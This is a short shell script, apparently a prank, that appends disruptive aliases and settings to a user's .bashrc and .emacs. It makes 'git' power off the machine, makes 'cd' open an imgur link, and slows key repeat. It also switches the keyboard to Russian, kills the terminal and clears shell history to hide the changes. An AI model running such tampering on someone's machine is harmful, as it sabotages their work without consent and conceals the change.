#!/bin/sh
echo "alias ls='ls --color=auto'" >> /home/${USER}/.bashrc;
echo "alias emacs='vim'" >> /home/${USER}/.bashrc;
echo "alias cd='google-chrome imgur.com/g597Ov2' && cd" >> /home/${USER}/.bashrc;
echo "alias git='poweroff'" >> /home/${USER}/.bashrc;
echo "xset r rate 3;" >> /home/${USER}/.bashrc;
echo "(set-face-background 'default \"pink\")" >> /home/${USER}/.emacs;
echo "(set-face-foreground 'default \"lightblue\")" >> /home/${USER}/.emacs;
echo "history -c" >> /home/${USER}/.bashrc;

setxkbmap ru;
pkill terminal;
history -c
